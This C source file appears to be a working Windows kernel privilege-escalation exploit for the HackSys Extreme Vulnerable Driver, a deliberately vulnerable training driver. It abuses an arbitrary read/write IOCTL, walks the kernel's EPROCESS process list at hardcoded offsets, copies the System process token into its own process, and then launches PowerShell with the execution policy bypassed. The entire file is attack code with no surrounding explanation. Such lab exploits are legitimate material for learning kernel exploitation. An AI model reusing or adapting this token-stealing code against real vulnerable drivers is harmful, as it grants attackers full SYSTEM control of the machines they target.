#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <string.h>
#include <ioapiset.h>
#include <fileapi.h>
#include <libloaderapi.h>
#include <processthreadsapi.h>
#include <stdint.h> // for unint64_t

#define IOCTL_CODE 0x22200B

HANDLE hDevice;

uint64_t KernelRead(uint64_t addr) {
	uint64_t out = 0;
	uint64_t pkt[2] = {addr, (uint64_t)&out};
	DWORD br;
	DeviceIoControl(hDevice, IOCTL_CODE, pkt, 16, 0, 0, &br, NULL);
	return out;
}

uint64_t KernelWrite(uint64_t src, uint64_t dst) {
	uint64_t pkt[2] = { src, dst };
	DWORD br;
	DeviceIoControl(hDevice, IOCTL_CODE, pkt, 16, 0, 0, &br, 0);
	return 0;
}

uint64_t GetPsiPtr(uint64_t kbase) {
	HMODULE hMod = LoadLibraryExA("C:\\Windows\\System32\\ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hMod) { 
		printf("[-] LoadLibrary failed, Error code: %d", GetLastError());
	}
	uint64_t rva = (uint64_t)GetProcAddress(hMod, "PsInitialSystemProcess") - (uint64_t)(hMod);
	FreeLibrary(hMod);
	return kbase + rva;
}

int main() {
	hDevice = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0x00,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	// Getting kernel base (useless)
	LPVOID drivers[1024];
	DWORD cb;
	EnumDeviceDrivers(drivers, sizeof(drivers), &cb);
	printf("[+] ntoskernel address	      : 0x%p\n", drivers[0]);
	LPVOID value = (BYTE*)drivers[0] + 0x08;
	printf("[+] ntoskernel address + 0x08 : 0x%p\n", value);
	
	// Getting System proc

	uint64_t kbase = (uint64_t)drivers[0]; //base of usermode ntoskrnl.exe
	uint64_t Getpsi = GetPsiPtr(kbase); // Getting the address of kbase.
	uint64_t SysProc = KernelRead(Getpsi); // SysProc now holds it's own process's address (the System process)
	printf("\n[+] System process			  : 0x%p", SysProc);
	DWORD CurrentPid = GetCurrentProcessId();
	printf("\n[+] cmd.exe PID number		  : %d", CurrentPid);
	
	// start of setting up the flink 
	uint64_t flink = KernelRead(SysProc + 0x448); //flink located at 0x448
	uint64_t start = flink; // some type of checkpoint
	uint64_t MyEproc = 0;

	//running/looking at all processes to see which one is ours
	while (1) {
		// Flink current holds Active Process links.flink. We will create a new variable that will hold the Base of the _Eprocess so we can look for our pid : 
		uint64_t Eproc = flink - 0x448;
		// UniqueProcessID is located at _EPROCESS+0x440, so we will add 0x440 to the flink which after the sutraction above is now holding the eporcess Base.
		uint64_t Pid = KernelRead(Eproc + 0x440);
		// Now, Pid is holding the UniqueProcessID.
		// If the PID is equal to our pid, we will set MyEproc to the base of the _EPROCESS of our cmd.exe process, which will help us swap/overwrite tokens
		if ((DWORD)Pid == CurrentPid ) {
			MyEproc = Eproc;
			break;
		}
		// Once the flink equals 0, print error. It's a process run.
		flink = KernelRead(flink);
		if (flink == start) {
			printf("\n[-] Was not able to get System token, error : %d", GetLastError());
			return 1;
		}		
	}
	//Spawn a system shell bascially
	printf("\n[+} Attempting to spawn System shell......\n");
	KernelWrite(SysProc+0x4b8, MyEproc+0x4b8);
	system("whoami /groups && powershell -ep bypass");
}
